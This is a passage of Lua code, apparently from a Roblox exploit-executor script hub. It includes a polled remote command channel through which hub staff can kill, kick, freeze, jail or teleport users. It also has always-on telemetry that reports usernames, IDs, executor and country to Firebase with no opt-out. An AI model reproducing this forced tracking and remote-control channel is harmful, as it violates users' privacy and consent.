				activeCall = false
			end)
			return
		end

		if activeCall or cardCount() >= MAX_CARDS then
			return
		end
		activeCall = true
		local place, job = data.place, data.job
		local rank = Library.GetCardTitle(data.name)
		local display = string.sub(tostring(data.display or data.name), 1, 40)

		local answered = false
		local function answer(result, dismiss)
			if answered then
				return
			end
			answered = true
			activeCall = false
			dismiss()
			task.spawn(function()
				pcall(post, { c = "resp", ref = data.n, r = result })
				if result == "accept" then
					Loader:Notify({ Title = "Joining", Content = "Teleporting to " .. display .. "...", Type = "Info", Duration = 3 })
					pcall(function()
						InfoTeleport:TeleportToPlaceInstance(place, job, LocalPlayer)
					end)
				end
			end)
		end

		-- rank in the title (OWNER / ADMIN) comes from whoever sent the invite
		buildInviteCard(
			rank,
			Library.GetCardColor(data.name) or theme.Accent,
			display,
			data.name,
			clean(data.text),
			CALL_TIMEOUT,
			function(dismiss) answer("accept", dismiss) end,
			function(dismiss) answer("decline", dismiss) end
		)

		task.delay(CALL_TIMEOUT, function()
			if not answered then
				answered = true
				activeCall = false
			end
		end)
	end

	-- Receive: giveaway (IY-style card + message in Global Chat) --------------------------------
	local giveawayStates = {}

	local function notifyListeners(st, status)
		for _, fn in ipairs(st.listeners) do
			pcall(fn, status)
		end
	end

	-- One join function used by BOTH the popup button and the chat button
	local function joinGiveaway(id)
		local st = giveawayStates[id]
		if not st or st.joined or st.joining or os.clock() > st.endsAt then
			return
		end
		st.joining = true
		notifyListeners(st, "joining")
		task.spawn(function()
			local ok = saveVip(myLower, "giveaway")
			st.joining = false
			if ok then
				st.joined = true
				pcall(post, { c = "join", ref = id })
				pcall(Library.PostSystem, "gw") -- "USER PARTICIPATED IN GIVEAWAY" in Global Chat
				Loader:Notify({ Title = "Giveaway", Content = "You joined and received the VIP title!", Type = "Success", Duration = 6, Force = true })
			else
				Loader:Notify({ Title = "Giveaway", Content = "Could not join, try again.", Type = "Error", Duration = 4 })
			end
			notifyListeners(st, ok and "joined" or "failed")
		end)
	end

	-- Giveaway received: message in Global Chat (with Join button) + IY-style popup
	local function registerGiveaway(data, display, rank)
		local dur = math.clamp(tonumber(data.dur) or 60, 10, 600)
		local st = {
			endsAt = os.clock() + dur,
			listeners = {},
			joined = Library.VipSet[myLower] == true,
			joining = false,
		}
		giveawayStates[data.n] = st

		if Library.ChatLog then
			local entry = Library.ChatLog:AddGiveaway(display, rank, st.endsAt, function()
				joinGiveaway(data.n)
			end, st.joined)
			if entry then
				table.insert(st.listeners, entry.SetState)
			end
		end
		if cardCount() < MAX_CARDS then
			local _, _, joinBtn = buildIYCard(
				"Giveaway",
				"An " .. string.lower(rank) .. " " .. display .. " started a giveaway. Participate to get the VIP title!",
				st.joined and "Participated" or "Participate", "Decline", dur,
				function() joinGiveaway(data.n) end,
				function(dismiss) dismiss() end
			)
			table.insert(st.listeners, function(status)
				if not joinBtn.Parent then
					return
				end
				if status == "joining" then
					joinBtn.Text = "Participating..."
				elseif status == "joined" then
					joinBtn.Text = "Participated"
				elseif not st.joined then
					joinBtn.Text = "Participate"
				end
			end)
		end
	end

	-- Receive: warning (cannot be dismissed, stays for its timer) -------------------------------
	local function showWarn(rank, display, text)
		if cardCount() >= MAX_CARDS then
			return
		end
		local _, body = buildCard(theme.Warning, "WARNING FROM [ VÆLOR " .. rank .. " ]", "⚠️", 12)
		addLabel(body, 3, text, 14, theme.Text)
		addLabel(body, 4, "— " .. display, 11, theme.SubText)
	end

	-- Receive: backrooms. Builds a local yellow room high above the map, moves the target in,
	-- and brings them back to the exact old spot after `sec` seconds (or on /unbackrooms) -------
	local backroomsToken = 0
	local backroomsExit = nil
	local function leaveBackrooms()
		if backroomsExit then
			backroomsToken += 1
			local fn = backroomsExit
			backroomsExit = nil
			pcall(fn)
		end
	end
	local function sendToBackrooms(sec, byName)
		local char = LocalPlayer.Character
		local root = char and char:FindFirstChild("HumanoidRootPart")
		if not root then
			return
		end
		leaveBackrooms()
		backroomsToken += 1
		local mine = backroomsToken
		local returnCF = root.CFrame

		local origin = Vector3.new(0, 4000, 0)
		local room = Instance.new("Model")
		room.Name = "VaelorBackrooms"
		local function part(size, pos, color, material)
			local p = Instance.new("Part")
			p.Anchored = true
			p.CanCollide = true
			p.Size = size
			p.Position = origin + pos
			p.Color = color
			p.Material = material or Enum.Material.SmoothPlastic
			p.TopSurface = Enum.SurfaceType.Smooth
			p.BottomSurface = Enum.SurfaceType.Smooth
			p.Parent = room
			return p
		end
		local wallColor = Color3.fromRGB(196, 174, 84)
		local size, h = 80, 14
		part(Vector3.new(size, 1, size), Vector3.new(0, 0, 0), Color3.fromRGB(150, 128, 62), Enum.Material.Fabric) -- floor
		local ceiling = part(Vector3.new(size, 1, size), Vector3.new(0, h, 0), Color3.fromRGB(215, 205, 150), Enum.Material.SmoothPlastic)
		part(Vector3.new(size, h, 1), Vector3.new(0, h / 2, size / 2), wallColor)
		part(Vector3.new(size, h, 1), Vector3.new(0, h / 2, -size / 2), wallColor)
		part(Vector3.new(1, h, size), Vector3.new(size / 2, h / 2, 0), wallColor)
		part(Vector3.new(1, h, size), Vector3.new(-size / 2, h / 2, 0), wallColor)
		-- maze-like inner walls
		part(Vector3.new(40, h, 1), Vector3.new(-12, h / 2, 14), wallColor)
		part(Vector3.new(1, h, 34), Vector3.new(14, h / 2, -10), wallColor)
		part(Vector3.new(28, h, 1), Vector3.new(-18, h / 2, -20), wallColor)
		part(Vector3.new(1, h, 26), Vector3.new(-6, h / 2, 2), wallColor)
		-- fluorescent lights
		for _, lp in ipairs({ Vector3.new(-20, 0, -20), Vector3.new(20, 0, 20), Vector3.new(0, 0, 0), Vector3.new(-25, 0, 25), Vector3.new(25, 0, -25) }) do
			local lamp = part(Vector3.new(6, 0.3, 3), Vector3.new(lp.X, h - 0.65, lp.Z), Color3.fromRGB(255, 252, 220), Enum.Material.Neon)
			lamp.CanCollide = false
			local light = Instance.new("PointLight")
			light.Brightness = 1.4
			light.Range = 34
			light.Color = Color3.fromRGB(255, 240, 160)
			light.Parent = lamp
		end
		room.Parent = workspace

		root.CFrame = CFrame.new(origin + Vector3.new(-30, 4, -30))
		Loader:Notify({
			Title = "Backrooms",
			Content = (byName and (tostring(byName) .. " sent you") or "You were sent") .. " to the Backrooms for " .. sec .. "s.",
			Type = "Warning",
			Duration = 4,
			Force = true,
		})

		backroomsExit = function()
			local r = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
			if r and (r.Position - origin).Magnitude < 200 then
				r.CFrame = returnCF
			end
			room:Destroy()
		end
		task.delay(sec, function()
			if backroomsToken == mine then
				leaveBackrooms()
				Loader:Notify({ Title = "Backrooms", Content = "You escaped the Backrooms.", Type = "Success", Duration = 3, Force = true })
			end
		end)
	end
	Loader:AddCleanup(leaveBackrooms)

	-- Receive: bring (same server only). No request: the player is teleported right away ----------
	local function showBring(data)
		local x, y, z = tonumber(data.x), tonumber(data.y), tonumber(data.z)
		if not (x and y and z) or math.abs(x) > 100000 or math.abs(y) > 100000 or math.abs(z) > 100000 then
			return
		end
		local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not root then
			return
		end
		root.CFrame = CFrame.new(x, y + 3, z)
		Loader:Notify({
			Title = "Bring",
			Content = tostring(data.display or data.name) .. " brought you to them.",
			Type = "Info",
			Duration = 3,
			Force = true,
		})
	end

	-- Handle commands ----------------------------------------------------------------------------
	local function handle(data)
		local cmd = data.c

		if cmd == "resp" then
			if myCalls[data.ref] then
				if data.r == "accept" then
					acceptedCount += 1
				else
					declinedCount += 1
				end
				if acceptedStat then
					acceptedStat:SetValue(tostring(acceptedCount), theme.Success)
				end
				if declinedStat then
					declinedStat:SetValue(tostring(declinedCount), theme.Warning)
				end
			end
			return
		end

		if cmd == "join" then
			if myGiveaways[data.ref] then
				giveawayJoined[data.ref] = giveawayJoined[data.ref] or {}
				local uid = tonumber(data.uid)
				if uid and not giveawayJoined[data.ref][uid] then
					giveawayJoined[data.ref][uid] = true
					joinedCount += 1
					if joinStat then
						joinStat:SetValue(tostring(joinedCount), theme.Success)
					end
				end
			end
			return
		end

		if cmd == "pollr" then
			local poll = myPolls[data.ref]
			local uid = tonumber(data.uid)
			if poll and uid and not poll.voted[uid] and (data.v == "yes" or data.v == "no") then
				poll.voted[uid] = true
				poll[data.v] += 1
			end
			return
		end

		local ok, rank = isStaffName(data.name)
		if not ok then
			return
		end

		if cmd == "announce" then
			local text = clean(data.text)
			if text ~= "" then
				showAnnouncement(rank, string.sub(tostring(data.display or data.name), 1, 40), text, data.dur)
			end
		elseif cmd == "call" then
			if tonumber(data.uid) == LocalPlayer.UserId then
				return
			end
			local target = tostring(data.target or "")
			if target ~= "all" and string.lower(target) ~= myLower then
				return
			end
			if type(data.place) ~= "number" or type(data.job) ~= "string" or #data.job > 64 or data.job == "" then
				return
			end
			showCall(data)
		elseif cmd == "giveaway" then
			if tonumber(data.uid) == LocalPlayer.UserId then
				return
			end
			registerGiveaway(data, string.sub(tostring(data.display or data.name), 1, 40), rank)
		elseif cmd == "mute" then
			local target = string.lower(tostring(data.target or ""))
			if target ~= "" and target:match("^[%w_]+$") then
				Library.MutedSet[target] = data.act ~= "remove" and true or nil
				if target == myLower then
					Loader:Notify({
						Title = data.act == "remove" and "Unmuted" or "Muted",
						Content = data.act == "remove" and "You can chat again." or "An admin muted you in Global Chat.",
						Type = "Warning",
						Duration = 5,
						Force = true,
					})
				end
			end
		elseif cmd == "ban" then
			local target = string.lower(tostring(data.target or ""))
			if target ~= "" and target:match("^[%w_]+$") then
				if not (PROTECT_OWNER_BAN and Library.GetCardTitle(target) == "OWNER" and data.act ~= "remove") then
					Library.BannedSet[target] = data.act ~= "remove" and true or nil
				end
				if target == myLower and data.act ~= "remove" then
					applyBan()
				end
			end
		elseif cmd == "warn" then
			if string.lower(tostring(data.target or "")) == myLower then
				local text = clean(data.text)
				if text ~= "" then
					showWarn(rank, string.sub(tostring(data.display or data.name), 1, 40), text)
				end
			end
		elseif cmd == "bring" then
			if tonumber(data.uid) ~= LocalPlayer.UserId
				and string.lower(tostring(data.target or "")) == myLower
				and type(data.job) == "string"
				and data.job == game.JobId
			then
				showBring(data)
			end
		elseif cmd == "party" then
			if tonumber(data.uid) ~= LocalPlayer.UserId and Library.PartyStyles[tostring(data.style)] then
				Library.ShowParty(tostring(data.style), string.sub(tostring(data.display or data.name), 1, 40))
			end
		elseif cmd == "fx" then
			local kind = tostring(data.kind or "")
			if tonumber(data.uid) ~= LocalPlayer.UserId and Library.FxKinds[kind] then
				local maxLen = (kind == "countdown" and 20) or (kind == "emoji" and 3) or 60
				Library.RunFx(kind, {
					text = Library.CutText(clean(data.text), maxLen),
					secs = tonumber(data.secs),
					dur = tonumber(data.dur),
					sides = tonumber(data.sides),
					val = data.val,
				}, string.sub(tostring(data.display or data.name), 1, 40))
			end
		elseif cmd == "clearchat" then
			if Library.ChatLog then
				Library.ChatLog:Clear()
			end
		elseif cmd == "slowmode" then
			local sec = math.clamp(tonumber(data.sec) or 0, 0, 60)
			Library.ChatCooldown = sec > 0 and sec or nil
			Loader:Notify({
				Title = "Chat",
				Content = sec > 0 and ("Slow mode: " .. sec .. "s between messages.") or "Slow mode turned off.",
				Type = "Info",
				Duration = 4,
			})
		elseif cmd == "dm" then
			if string.lower(tostring(data.target or "")) == myLower then
				local text = clean(data.text)
				if text ~= "" and cardCount() < MAX_CARDS then
					local accent = Library.GetCardColor(data.name) or theme.Accent
					local _, body = buildCard(accent, "MESSAGE FROM [ VÆLOR " .. rank .. " ]", "💬", 12)
					addLabel(body, 3, text, 14, theme.Text)
					addLabel(body, 4, "— " .. string.sub(tostring(data.display or data.name), 1, 40), 11, theme.SubText)
				end
			end
		elseif cmd == "msg" then
			if tonumber(data.uid) ~= LocalPlayer.UserId then
				local text = clean(data.text)
				if text ~= "" then
					Loader:Notify({ Title = rank .. " " .. string.sub(tostring(data.display or data.name), 1, 40), Content = text, Type = "Info", Duration = 8, Force = true })
				end
			end
		elseif cmd == "poll" then
			if tonumber(data.uid) ~= LocalPlayer.UserId then
				local text = clean(data.text)
				if text ~= "" and cardCount() < MAX_CARDS then
					local pollId = data.n
					local dur = math.clamp(tonumber(data.dur) or 30, 10, 120)
					local function vote(v)
						return function(dismiss)
							dismiss()
							task.spawn(function()
								pcall(post, { c = "pollr", ref = pollId, v = v })
							end)
						end
					end
					buildIYCard("Poll", text, "Yes", "No", dur, vote("yes"), vote("no"))
				end
			end
		elseif cmd == "freeze" then
			if string.lower(tostring(data.target or "")) == myLower then
				local sec = math.clamp(math.floor(tonumber(data.sec) or 10), 3, 100)
				local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				if root then
					freezeToken += 1
					local mine = freezeToken
					root.Anchored = true
					Loader:Notify({ Title = "Frozen", Content = "An admin froze you for " .. sec .. "s.", Type = "Warning", Duration = 4, Force = true })
					task.delay(sec, function()
						if freezeToken == mine then
							local r = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
							if r then
								r.Anchored = false
							end
						end
					end)
				end
			end
		elseif cmd == "unfreeze" then
			if string.lower(tostring(data.target or "")) == myLower then
				freezeToken += 1
				local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
				if root then
					root.Anchored = false
				end
				Loader:Notify({ Title = "Unfrozen", Content = "You can move again.", Type = "Success", Duration = 3, Force = true })
			end
		elseif cmd == "jail" then
			-- every hub user in the same server builds the cage (visual); only the target is locked inside
			local target = string.lower(tostring(data.target or ""))
			if target ~= "" and target:match("^[%w_]+$")
				and type(data.job) == "string" and data.job == game.JobId
			then
				local sec = math.clamp(math.floor(tonumber(data.sec) or 30), 10, 100)
				local plr = findPlayerByName(target)
				local root = plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
				if root then
					local isMe = target == myLower
					if isMe then
						Loader:Notify({ Title = "Jail", Content = "An admin jailed you for " .. sec .. "s.", Type = "Warning", Duration = 4, Force = true })
					end
					startCage(target, root.Position, isMe, isMe, sec, isMe and function()
						Loader:Notify({ Title = "Jail", Content = "You are free.", Type = "Success", Duration = 3, Force = true })
					end or nil)
				end
			end
		elseif cmd == "unjail" then
			local target = string.lower(tostring(data.target or ""))
			if target ~= "" then
				stopCage(target)
				if target == myLower then
					Loader:Notify({ Title = "Jail", Content = "You are free.", Type = "Success", Duration = 3, Force = true })
				end
			end
		elseif cmd == "kill" then
			if string.lower(tostring(data.target or "")) == myLower then
				local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				if hum then
					Loader:Notify({ Title = "Admin", Content = "An admin killed you.", Type = "Warning", Duration = 3, Force = true })
					hum.Health = 0
				end
			end
		elseif cmd == "xfx" then
			-- staff effect (Gojo / Purple / Shrine / Clones / Giant / Tiny / Heaven / Blackout / Thunder)
			local kind = tostring(data.kind or "")
			local who = string.lower(tostring(data.target or ""))
			local forMe = who == myLower
			local forAll = who == "all"
				and Library.RemoteFxAllKinds and Library.RemoteFxAllKinds[kind]
				and type(data.job) == "string" and data.job == game.JobId
			if (forMe or forAll) and Library.RunRemoteFx
				and Library.RemoteFxKinds and Library.RemoteFxKinds[kind]
			then
				if kind == "thunder" then
					Loader:Notify({ Title = "Admin", Content = "Thunder strike incoming...", Type = "Warning", Duration = 3, Force = true })
				end
				task.spawn(function()
					pcall(Library.RunRemoteFx, kind, { sec = data.sec, uid = data.uid, count = data.count })
				end)
			end
		elseif cmd == "backrooms" then
			if string.lower(tostring(data.target or "")) == myLower then
				local sec = math.clamp(math.floor(tonumber(data.sec) or 30), 10, 100)
				sendToBackrooms(sec, data.display or data.name)
			end
		elseif cmd == "unbackrooms" then
			if string.lower(tostring(data.target or "")) == myLower then
				leaveBackrooms()
			end
		elseif cmd == "ragdoll" then
			if string.lower(tostring(data.target or "")) == myLower then
				local sec = math.clamp(math.floor(tonumber(data.sec) or 8), 3, 100)
				ragToken += 1
				local mine = ragToken
				setRagdoll(true)
				Loader:Notify({ Title = "Ragdoll", Content = "An admin ragdolled you for " .. sec .. "s.", Type = "Warning", Duration = 4, Force = true })
				task.delay(sec, function()
					if ragToken == mine then
						setRagdoll(false)
					end
				end)
			end
		elseif cmd == "unragdoll" then
			if string.lower(tostring(data.target or "")) == myLower then
				ragToken += 1
				setRagdoll(false)
			end
		elseif cmd == "sit" then
			if tonumber(data.uid) ~= LocalPlayer.UserId
				and string.lower(tostring(data.target or "")) == myLower
				and type(data.job) == "string"
				and data.job == game.JobId
			then
				local x, y, z = tonumber(data.x), tonumber(data.y), tonumber(data.z)
				local lx, lz = tonumber(data.lx) or 0, tonumber(data.lz) or -1
				if x and y and z and math.abs(x) < 100000 and math.abs(y) < 100000 and math.abs(z) < 100000 then
					local char = LocalPlayer.Character
					local root = char and char:FindFirstChild("HumanoidRootPart")
					local hum = char and char:FindFirstChildOfClass("Humanoid")
					if root and hum then
						local look = Vector3.new(lx, 0, lz)
						look = look.Magnitude > 0.1 and look.Unit or Vector3.new(0, 0, -1)
						local admin = Vector3.new(x, y, z)
						local spot = admin + look * 5 + Vector3.new(0, 3, 0)
						root.CFrame = CFrame.lookAt(spot, Vector3.new(x, spot.Y, z))
						task.wait(0.1)
						hum.Sit = true
						Loader:Notify({ Title = "Sit", Content = "You were made to sit in front of " .. string.sub(tostring(data.display or data.name), 1, 40) .. ".", Type = "Info", Duration = 3, Force = true })
					end
				end
			end
		elseif cmd == "respawn" then
			if string.lower(tostring(data.target or "")) == myLower then
				local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				if hum then
					Loader:Notify({ Title = "Respawn", Content = "An admin respawned you.", Type = "Warning", Duration = 3, Force = true })
					hum.Health = 0
				end
			end
		elseif cmd == "rejoin" then
			if string.lower(tostring(data.target or "")) == myLower then
				Loader:Notify({ Title = "Rejoin", Content = "An admin asked you to rejoin...", Type = "Warning", Duration = 3, Force = true })
				task.delay(1.5, function()
					pcall(function()
						if #InfoPlayers:GetPlayers() <= 1 then
							InfoTeleport:Teleport(game.PlaceId, LocalPlayer)
						else
							InfoTeleport:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
						end
					end)
				end)
			end
		elseif cmd == "kick" then
			if string.lower(tostring(data.target or "")) == myLower then
				Loader:Notify({ Title = "Kicked", Content = "You were kicked by " .. rank .. ".", Type = "Error", Duration = 3, Force = true })
				task.delay(1.5, function()
					pcall(function()
						LocalPlayer:Kick("Kicked by VÆLOR " .. rank)
					end)
				end)
			end
		elseif cmd == "tagvis" then
			local r = tostring(data.rank or "")
			if r == "OWNER" or r == "ADMIN" then
				Library.TagHidden[r] = data.hidden == true or nil
				if Library.RefreshTags then
					Library.RefreshTags()
				end
			end
		elseif cmd == "vip" then
			local target = string.lower(tostring(data.target or ""))
			if target == "" or not target:match("^[%w_]+$") then
				return
			end
			if data.act == "remove" then
				Library.VipSet[target] = nil
				if target == myLower then
					Loader:Notify({ Title = "VIP", Content = "Your VIP title was removed.", Type = "Warning", Duration = 5, Force = true })
				end
			else
				Library.VipSet[target] = true
				if target == myLower then
					Loader:Notify({ Title = "VIP", Content = "You received the VIP title!", Type = "Success", Duration = 6, Force = true })
				end
			end
		end
	end

	local function pollCommands()
		local ok, res = pcall(httpRequest, {
			Url = CMD_URL .. "/json?poll=1&since=" .. tostring(sinceValue),
			Method = "GET",
		})
		if not ok or type(res) ~= "table" or type(res.Body) ~= "string" then
			return
		end
		local maxTime = 0
		for line in string.gmatch(res.Body, "[^\r\n]+") do
			local okLine, event = pcall(InfoHttp.JSONDecode, InfoHttp, line)
			if okLine and type(event) == "table" and event.event == "message" and type(event.message) == "string" then
				local t = tonumber(event.time) or 0
				if t > maxTime then
					maxTime = t
				end
				local okMsg, data = pcall(InfoHttp.JSONDecode, InfoHttp, event.message)
				if okMsg and type(data) == "table" and data.k == CMD_KEY then
					local id = tostring(data.n or event.id)
					if not seen[id] then
						seen[id] = true
						-- first poll only loads old history (so old announcements/calls never pop up)
						if not firstPoll then
							pcall(handle, data)
						end
					end
				end
			end
		end
		if maxTime > 0 then
			sinceValue = maxTime
		end
		firstPoll = false
	end

	task.spawn(function()
		if not httpRequest then
			return
		end
		while cmdActive and not Loader._destroyed do
			pcall(pollCommands)
			task.wait(CMD_POLL)
		end
	end)

	task.spawn(function()
		if not httpRequest then
			return
		end
		while cmdActive and not Loader._destroyed do
			pcall(refreshVip)
			pcall(refreshModeration)
			for _ = 1, VIP_REFRESH do
				if not cmdActive or Loader._destroyed then
					return
				end
				task.wait(1)
			end
		end
	end)

	Loader:AddCleanup(function()
		cmdActive = false
		holder:Destroy()
	end)

	-- Usage stats (username, id, game, executor, dates, executions, state) ---------------------
	-- Always on (the user cannot turn it off). Saved in Firebase under /users.
	local statsGameName = "Game " .. tostring(game.PlaceId)
	fetchGameInfo(game.PlaceId, function(info)
		statsGameName = info.Name
	end)

	local myCountry = "?"
	task.spawn(function()
		local okC, code = pcall(function()
			return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(LocalPlayer)
		end)
		if okC and type(code) == "string" and code ~= "" then
			myCountry = string.upper(string.sub(code, 1, 3))
		end
	end)

	local function sendStats(state, isStart)
		if not httpRequest then
			return
		end
		local path = "/users/" .. LocalPlayer.UserId
		local body = {
			uid = LocalPlayer.UserId,
			name = LocalPlayer.Name,
			display = LocalPlayer.DisplayName,
			gameId = game.PlaceId,
			gameName = statsGameName,
			executor = Library.GetExecutorName(),
			country = myCountry,
			version = HUB_VERSION,
			state = state,
			last = os.time(),
		}
		if isStart then
			local okFirst, resFirst = fb("GET", path .. "/first.json")
			if okFirst and resFirst and resFirst.Body == "null" then
				body.first = os.time()
			end
			body.execs = { [".sv"] = { increment = 1 } } -- +1 execution, counted by the database
		end
		fb("PATCH", path .. ".json", body)
	end

	task.spawn(function()
		task.wait(3)
		if Loader._destroyed then
			return
		end
		sendStats("online", true)
		while cmdActive and not Loader._destroyed do
			for _ = 1, 300 do -- every 5 minutes
				if not cmdActive or Loader._destroyed then
					return
				end
				task.wait(1)
			end
			sendStats("online", false)
		end
	end)

	Loader:AddCleanup(function()
		task.spawn(sendStats, "offline", false)
	end)

	-- Admin tab (only OWNER / ADMIN see it) ------------------------------------------------------
	if not isStaff then
		return
	end

	local function guard()
		if os.clock() - lastSend < CMD_COOLDOWN then
			error("Slow down a little.")
		end
		lastSend = os.clock()
	end

	local function validUser(text)
		local name = string.lower(clean(text))
		if name == "" then
			error("Type a username first.")
		end
		if not name:match("^[%w_]+$") then
			error("Invalid username.")
		end
		return name
	end

	local function sendAnnounce(text, dur)
		text = clean(text)
		if text == "" then
			error("Write a message first.")
		end
		guard()
		dur = math.clamp(math.floor(tonumber(dur) or ANNOUNCE_TIME), 5, 60)
		post({ c = "announce", text = text, dur = dur })
		showAnnouncement(myRank, LocalPlayer.DisplayName, text, dur)
		Loader:Notify({ Title = "Admin", Content = "Announcement sent.", Type = "Success", Duration = 2.5 })
	end

	local function sendCall(target, note)
		if game.JobId == "" then
			error("No server ID available here.")
		end
		guard()
		local callId = LocalPlayer.UserId .. "-" .. math.random(100000, 999999) .. "-" .. os.time()
		myCalls[callId] = true
		post({
			c = "call",
			n = callId,
			target = target,
			place = game.PlaceId,
			job = game.JobId,
			text = clean(note),
		})
		Loader:Notify({
			Title = "Admin",
			Content = target == "all" and "Call sent to everyone." or ("Call sent to " .. target .. "."),
			Type = "Success",
			Duration = 3,
		})
	end

	local function giveVip(user, days)
		local name = validUser(user)
		guard()
		if not saveVip(name, LocalPlayer.Name, days) then
			error("Could not save VIP (check your Firebase rules for /vip).")
		end
		post({ c = "vip", target = name, act = "give" })
		Loader:Notify({ Title = "VIP", Content = name .. " is now VIP" .. (days and (" for " .. days .. " days.") or " (permanent)."), Type = "Success", Duration = 4 })
	end

	local function removeVip(user)
		local name = validUser(user)
		guard()
		if not fb("DELETE", "/vip/" .. name .. ".json") then
			error("Could not remove VIP (check your Firebase rules for /vip).")
		end
		Library.VipSet[name] = nil
		post({ c = "vip", target = name, act = "remove" })
		Loader:Notify({ Title = "VIP", Content = name .. " is no longer VIP.", Type = "Info", Duration = 3 })
	end

	local function startGiveaway(seconds)
		seconds = math.clamp(math.floor(tonumber(seconds) or 60), 10, 600)
		guard()
		local id = LocalPlayer.UserId .. "-" .. math.random(100000, 999999) .. "-" .. os.time()
		myGiveaways[id] = true
		joinedCount = 0
		if joinStat then
			joinStat:SetValue("0", theme.Success)
		end
		post({ c = "giveaway", n = id, dur = seconds })
		if Library.ChatLog then
			Library.ChatLog:AddGiveaway(LocalPlayer.DisplayName, myRank, os.clock() + seconds, nil, true)
		end
		Loader:Notify({ Title = "Giveaway", Content = "Giveaway started for " .. seconds .. "s.", Type = "Success", Duration = 3 })
		task.delay(seconds + 3, function()
			if not Loader._destroyed then
				Loader:Notify({
					Title = "Giveaway ended",
					Content = joinedCount .. " user(s) joined and received VIP.",
					Type = "Success",
					Duration = 8,
					Force = true,
				})
			end
		end)
	end

	-- staff can now use every command on each other (OWNER <-> ADMIN)
	local function staffGuard(name)
	end

	local function muteUser(user, on)
		local name = validUser(user)
		staffGuard(name)
		guard()
		local ok
		if on then
			ok = fb("PUT", "/muted/" .. name .. ".json", { by = LocalPlayer.Name, t = os.time() })
		else
			ok = fb("DELETE", "/muted/" .. name .. ".json")
		end
		if not ok then
			error("Could not save (check your Firebase rules for /muted).")
		end
		Library.MutedSet[name] = on and true or nil
		post({ c = "mute", target = name, act = on and "give" or "remove" })
		Loader:Notify({ Title = "Mute", Content = name .. (on and " is muted." or " is unmuted."), Type = on and "Warning" or "Success", Duration = 3 })
	end

	local function banUser(user, on)
		local name = validUser(user)
		if on and PROTECT_OWNER_BAN and Library.GetCardTitle(name) == "OWNER" then
			error("The OWNER can't be banned.")
		end
		guard()
		local ok
		if on then
			ok = fb("PUT", "/banned/" .. name .. ".json", { by = LocalPlayer.Name, t = os.time() })
		else
			ok = fb("DELETE", "/banned/" .. name .. ".json")
		end
		if not ok then
			error("Could not save (check your Firebase rules for /banned).")
		end
		Library.BannedSet[name] = on and true or nil
		post({ c = "ban", target = name, act = on and "give" or "remove" })
		Loader:Notify({ Title = "Ban", Content = name .. (on and " is banned from the hub." or " is unbanned."), Type = on and "Warning" or "Success", Duration = 3 })
	end

	local function warnUser(user, text)
		local name = validUser(user)
		text = clean(text)
		if text == "" then
			error("Write the warning text first.")
		end
		guard()
		post({ c = "warn", target = name, text = text })
		Loader:Notify({ Title = "Warn", Content = "Warning sent to " .. name .. ".", Type = "Success", Duration = 3 })
	end

	local function kickUser(user)
		local name = validUser(user)
		staffGuard(name)
		guard()
		post({ c = "kick", target = name })
		Loader:Notify({ Title = "Kick", Content = "Kick sent to " .. name .. ".", Type = "Success", Duration = 3 })
	end

	-- one helper for commands that only target one player (freeze / unfreeze / respawn / rejoin)
	local function targetCmd(c, user, extra, doneText)
		local name = validUser(user)
		staffGuard(name)
		guard()
		local payload = extra or {}
		payload.c = c
		payload.target = name
		post(payload)
		Loader:Notify({ Title = "Admin", Content = doneText .. " " .. name .. ".", Type = "Success", Duration = 3 })
	end

	local function freezeUser(user, secText)
		local sec = math.clamp(math.floor(tonumber(secText) or 10), 3, 100)
		targetCmd("freeze", user, { sec = sec }, "Froze (" .. sec .. "s)")
	end

	local function backroomsUser(user, secText)
		local sec = math.clamp(math.floor(tonumber(secText) or 30), 10, 100)
		targetCmd("backrooms", user, { sec = sec }, "Sent to Backrooms (" .. sec .. "s):")
	end

	-- Effects: shown on the target's screen (Gojo, Purple, Shrine, Clones of you, Giant, Tiny, Heaven, Blackout, Thunder)
	local function fxUser(kind, user, secText, label, extra)
		local sec = math.clamp(math.floor(tonumber(secText) or 15), 5, 60)
		local payload = extra or {}
		payload.kind = kind
		payload.sec = sec
		targetCmd("xfx", user, payload, label)
	end

	-- Everyone in YOUR server who runs the hub (staff are not affected)
	local function fxAll(kind, secText, label)
		if game.JobId == "" then
			error("No server ID available here.")
		end
		local sec = math.clamp(math.floor(tonumber(secText) or 15), 5, 60)
		guard()
		post({ c = "xfx", kind = kind, sec = sec, target = "all", job = game.JobId })
		Loader:Notify({ Title = "Admin", Content = label .. " (everyone in this server).", Type = "Success", Duration = 3 })
	end

	local function jailUser(user, secText)
		local sec = math.clamp(math.floor(tonumber(secText) or 30), 10, 100)
		local name = validUser(user)
		targetCmd("jail", name, { sec = sec, job = game.JobId }, "Jailed (" .. sec .. "s)")
		-- you see the cage too
		local plr = findPlayerByName(name)
		local root = plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
		if root then
			startCage(name, root.Position, false, false, sec)
		end
	end

	local function unjailUser(user)
		local name = validUser(user)
		targetCmd("unjail", name, nil, "Freed")
		stopCage(name)
	end

	local function ragdollUser(user, secText)
		local sec = math.clamp(math.floor(tonumber(secText) or 8), 3, 100)
		targetCmd("ragdoll", user, { sec = sec }, "Ragdolled (" .. sec .. "s)")
	end

	-- Makes the player appear in front of you (same server only) and sit
	local function sitUser(user)
		local name = validUser(user)
		staffGuard(name)
		local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
		if not root then
			error("Your character is not loaded.")
		end
		if game.JobId == "" then
			error("No server ID available here.")
		end
		guard()
		local pos, look = root.Position, root.CFrame.LookVector
		post({ c = "sit", target = name, job = game.JobId, x = pos.X, y = pos.Y, z = pos.Z, lx = look.X, lz = look.Z })
		Loader:Notify({ Title = "Sit", Content = name .. " will sit in front of you (same server only).", Type = "Success", Duration = 3 })
	end

	local function dmUser(user, text)
		local name = validUser(user)
		text = clean(text)
		if text == "" then
			error("Write the message first.")
		end
		guard()
		post({ c = "dm", target = name, text = text })
